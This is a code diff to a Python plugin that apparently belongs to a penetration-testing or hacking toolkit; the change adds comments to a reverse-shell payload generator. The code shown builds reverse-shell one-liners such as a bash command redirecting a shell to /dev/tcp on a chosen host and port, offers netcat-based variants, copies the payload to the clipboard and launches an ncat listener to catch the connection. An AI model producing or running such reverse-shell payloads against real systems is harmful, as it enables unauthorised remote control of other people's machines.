@@ -2,6 +2,7 @@ import os
 from plugins.common import *
 import pyperclip
 
+# reverse shell payloads
 def ohios(host, port, _type, shell):
     ohio = {
         'bash_i':        f"{shell} -i >& /dev/tcp/{host}/{port} 0>&1",
@@ -14,7 +15,9 @@ def ohios(host, port, _type, shell):
     }
     return ohio.get(_type, "what u doing gng")
 
+# select shell type and generate payload
 def shell(host, port, bind):
+    # validate ip
     if not checkip(host):
         logging.error('Please enter a valid IP')
         return
@@ -22,33 +25,36 @@ def shell(host, port, bind):
     shells = ['sh', '/bin/sh', 'bash', '/bin/bash', 'cmd', 'powershell', 'pwsh', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh', 'mksh', 'dash']
     types  = ['bash_i', 'bash_196', 'bash_read_line', 'bash_5', 'bash_udp', 'nc_mkfifo', 'nc_e']
 
+    # select shell
     print(f"\n{white}• {yellow}Available shells:")
     for s in shells:
         print(f"  {gray}• {white}{s}")
     print()
-
     uno = input(f"{yellow}Select shell>{white} ").strip()
     if uno not in shells:
         logging.error('Please choose a valid shell')
         return
 
+    # validate port
     if not str(port).isdigit() or not (1 <= int(port) <= 65535):
         logging.error('Invalid port number')
         return
 
+    # select payload type
     print(f"\n{white}• {yellow}Available types:")
     for t in types:
         print(f"  {gray}• {white}{t}")
     print()
-
     t = input(f"{yellow}Select type>{white} ").strip()
     if t not in types:
         logging.error('Please choose a valid type')
         return
 
+    # generate payload and copy to clipboard
     result = ohios(host, port, t, uno)
     try: pyperclip.copy(result)
     except Exception as e: logging.error("Couldn't copy string to clipboaard")
     print(f"\n{green}Payload>{white} {result}\n")
 
+    # start listener
     os.system(f"ncat -lvnp {bind}")
